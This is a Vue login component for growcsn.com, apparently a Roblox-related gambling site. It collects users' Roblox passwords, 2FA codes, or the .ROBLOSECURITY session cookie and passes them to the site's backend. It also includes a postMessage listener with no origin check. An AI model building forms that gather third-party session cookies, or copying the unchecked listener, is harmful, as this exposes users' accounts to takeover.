<template>
    <div class="login-roblox">
        <div v-if="authStep === 'captcha'" class="roblox-captcha">
            <iframe
                v-bind:src="modalsData.captchaUrl"
                width="320"
                height="320"
            />
        </div>
        <div v-else-if="authStep === 'twostep'" class="roblox-twostep">
            <div class="twostep-title">FILL IN YOUR 2FA CODE</div>
            <div class="twostep-input">
                <input v-model="loginTwoStepCode" type="text" placeholder="ENTER 2FA CODE" />
            </div>
        </div>
        <div v-else-if="tab === 'roblox login'" class="roblox-login">
            <div class="login-element">
                <div class="element-title">USERNAME</div>
                <div class="element-input">
                    <input v-model="loginUsername" type="text" placeholder="ENTER USERNAME" />
                </div>
            </div>
            <div class="login-element">
                <div class="element-title">PASSWORD</div>
                <div class="element-input">
                    <input v-model="loginPassword" type="password" placeholder="ENTER PASSWORD" />
                </div>
            </div>
        </div>
        <div v-else class="roblox-cookie">
            <div class="cookie-title">FILL IN YOUR .ROBLOSECURITY COOKIE</div>
            <div class="cookie-input">
                <input v-model="loginCookie" type="text" placeholder="ENTER .ROBLOSECURITY COOKIE" />
            </div>
        </div>
        <div class="roblox-info">
            By accessing growcsn.com, I attest that I am at least 18 years old and have read and agree with the <button v-on:click="loginTermsButton()" class="button-terms">Terms of Service</button>.
        </div>
        <div class="roblox-buttons">
            <button v-on:click="$parent.modalSetTab(tab === 'roblox login' ? 'roblox cookie' : 'roblox login')" class="button-toggle" v-bind:class="{ 'button-active': tab === 'roblox cookie' }" v-bind:disabled="authSendLoginLoading === true || authStep !== 'login'">
                <div class="button-inner">.ROBLOSECURITY</div>
            </button>
            <button v-on:click="loginActionButton()" class="button-action" v-bind:disabled="authSendLoginLoading === true || authStep === 'captcha'">
                <div class="button-inner">
                    <transition name="fade" mode="out-in">
                        <ButtonLoading v-if="authSendLoginLoading === true" />
                        <div v-else class="inner-content">LOGIN</div>
                    </transition>
                </div>
            </button>
        </div>
    </div>
</template>

<script>
    import { mapGetters, mapActions } from 'vuex';
    import ButtonLoading from '@/components/ButtonLoading';

    export default {
        name: 'LoginRoblox',
        components: {
            ButtonLoading
        },
        props: [
            'tab'
        ],
        data() {
            return {
                loginUsername: null,
                loginPassword: null,
                loginTwoStepCode: null,
                loginCookie: null
            }
        },
        methods: {
            ...mapActions([
                'modalsSetShow', 
                'authSendRoblox', 
                'authSendRobloxTwoStep', 
                'authSendRobloxCookie'
            ]),
            loginActionButton() {
                if(this.tab === 'roblox cookie') {
                    if(this.loginCookie === null || this.loginCookie.trim() === '') {
                        return;
                    }

                    const data = { cookie: this.loginCookie.trim() };
                    this.authSendRobloxCookie(data);
                } else if(this.authStep === 'login') {
                    if(this.loginUsername === null || this.loginUsername.trim() === '') {
                        return;
                    }

                    if(this.loginPassword === null || this.loginPassword.trim() === '') {
                        return;
                    }

                    const data = { step: 'login', username: this.loginUsername, password: this.loginPassword };
                    this.authSendRoblox(data);
                } else if(this.authStep === 'twostep') {
                    if(this.loginTwoStepCode === null || this.loginTwoStepCode.trim() === '') {
                        return;
                    }

                    const data = { ...this.modalsData, code: this.loginTwoStepCode.trim() };
                    this.authSendRobloxTwoStep(data);
                }       
            },
            loginTermsButton() {
                this.modalsSetShow(null);
                setTimeout(() => { this.modalsSetShow('Terms'); }, 300);
            }
        },
        computed: {
            ...mapGetters([
                'modalsShow', 
                'modalsData', 
                'authSendLoginLoading', 
                'authStep'
            ])
        },
        mounted() {
            window.addEventListener('message', (event) => {
                event = typeof(event.data) === 'object' ? event.data : JSON.parse(event.data);

                if(event.eventId === 'challenge-completed') {
                    const data = { step: 'captcha', username: this.loginUsername, password: this.loginPassword, challengeId: this.modalsData.challengeId, captchaId: this.modalsData.captchaId, captchaToken: event.payload.sessionToken, secureAuthenticationIntent: this.modalsData.secureAuthenticationIntent };
                    this.authSendRoblox(data);
                }
            });
        }
    }
</script>

<style scoped>
    .login-roblox {
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    .roblox-login {
        width: 100%;
    }

    .login-roblox .roblox-twostep,
    .login-roblox .roblox-cookie,
    .login-roblox .login-element {
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    .login-roblox .login-element {
        margin-top: 35px;
    }

    .login-roblox .login-element:first-child {
        margin-top: 0;
    }

    .login-roblox .twostep-title,
    .login-roblox .cookie-title,
    .login-roblox .element-title {
        font-size: 14px;
        font-weight: 800;
        color: #bbbfd0;
    }

    .login-roblox .twostep-input,
    .login-roblox .cookie-input,
    .login-roblox .element-input {
        width: 100%;
        height: 78px;
        position: relative;
        margin-top: 20px;
        padding: 1px;
        filter: drop-shadow(0px 4px 25px rgba(15, 41, 63, 0.35));
    }

    .login-roblox .twostep-input:before,
    .login-roblox .cookie-input:before,
    .login-roblox .element-input:before {
        content: '';
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background: linear-gradient(180deg, #04131f 0%, #223a4e 100%);
        clip-path: polygon(16px 0, calc(100% - 16px) 0, 100% 25%, 100% 75%, calc(100% - 16px) 100%, 16px 100%, 0 75%, 0 25%);
    }

    .login-roblox .twostep-input input,
    .login-roblox .cookie-input input,
    .login-roblox .element-input input {
        width: 100%;
        height: 100%;
        padding: 0 115px 0 25px;
        font-size: 16px;
        font-weight: 600;
        color: #ffffff;
        background-color: #072435;
        clip-path: polygon(16px 0, calc(100% - 16px) 0, 100% 25%, 100% 75%, calc(100% - 16px) 100%, 16px 100%, 0 75%, 0 25%);
    }

    .login-roblox .twostep-input input::placeholder,
    .login-roblox .cookie-input input::placeholder,
    .login-roblox .element-input input::placeholder {
        color: #5e768e;
    }

    .login-roblox .roblox-info {
        width: 100%;
        margin-top: 35px;
        text-align: center;
        font-size: 14px;
        font-weight: 400;
        color: #49687d;
    }

    .login-roblox .roblox-info button.button-terms {
        text-decoration: underline;
        font-size: 14px;
        font-weight: 700;
        color: #db7d48;
    }

    .login-roblox .roblox-buttons {
        display: flex;
        align-items: center;
        margin-top: 35px;
    }

    .login-roblox button.button-toggle {
        width: 200px;
        height: 54px;
        position: relative;
        margin-right: 20px;
        padding: 1px;
        filter: drop-shadow(0px 1px 3px rgba(0, 0, 0, 0.35));
        transition: filter 0.3s ease;
        z-index: 1;
        transition: all .2s;
    }
    .login-roblox button.button-toggle:hover {
        transition-duration: .2s; 
        opacity: .8;
    }
    .login-roblox button.button-toggle:active {
        transition-duration: .2s;
        scale: .9;
    }

    .login-roblox button.button-toggle.button-active {
        filter: drop-shadow(0px 4px 25px rgba(1, 230, 169, 0.15)) 
                drop-shadow(0px 2px 25px rgba(15, 41, 63, 0.35));
    }

    .login-roblox button.button-action {
        width: 180px;
        height: 54px;
        position: relative;
        filter: drop-shadow(0px 1px 3px rgba(0, 0, 0, 0.35)) drop-shadow(0px 4px 25px rgba(1, 230, 169, 0.15));
        transition: all .2s;
    }
    .login-roblox button.button-action:hover {
        transition-duration: .2s; 
        opacity: .8;
    }
    .login-roblox button.button-action:active {
        transition-duration: .2s;
        scale: .9;
    }

    .login-roblox button.button-toggle::before {
        content: '';
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #1a4f63;
        clip-path: polygon(11px 0, calc(100% - 11px) 0, 100% 25%, 100% 75%, calc(100% - 11px) 100%, 11px 100%, 0 75%, 0 25%);
        z-index: -1;
    }

    .login-roblox button.button-toggle.button-active::before {
        background: linear-gradient(180deg, rgba(0, 0, 0, 0) 0%, #01e0a3 100%);
    }

    .login-roblox button.button-toggle::after {
        content: '';
        width: calc(100% - 2px);
        height: calc(100% - 2px);
        position: absolute;
        top: 1px;
        left: 1px;
        background-color: #07243a;
        clip-path: polygon(11px 0, calc(100% - 11px) 0, 100% 25%, 100% 75%, calc(100% - 11px) 100%, 11px 100%, 0 75%, 0 25%);
        z-index: -1;
    }

    .login-roblox button.button-toggle .button-inner,
    .login-roblox button.button-action .button-inner {
        width: 100%;
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
        font-weight: 800;
        clip-path: polygon(11px 0, calc(100% - 11px) 0, 100% 25%, 100% 75%, calc(100% - 11px) 100%, 11px 100%, 0 75%, 0 25%);
    }

    .login-roblox button.button-toggle .button-inner {
        color: #bbbfd0;
        background-color: #1a4f63;
    }

    .login-roblox button.button-toggle.button-active .button-inner {
        color: #00ffc2;
        background: radial-gradient(60% 60% at 50% 50%, rgba(0, 255, 194, 0.2) 0%, rgba(0, 0, 0, 0) 100%), 
                    linear-gradient(255deg, rgba(0, 255, 194, 0.05) 0%, rgba(0, 170, 109, 0.05) 100%);
    }

    .login-roblox button.button-action .button-inner {
        color: #ffffff;
        background: linear-gradient(250deg, #00ffc2 0%, #00aa6d 100%);
    }

    @media only screen and (max-width: 430px) {

        .login-roblox .roblox-buttons {
            width: 100%;
            flex-direction: column;
        }

        .login-roblox button.button-toggle,
        .login-roblox button.button-action {
            width: 100%;
        }

        .login-roblox button.button-toggle {
            margin-bottom: 10px;
            margin-right: 0;
        }

    }
</style>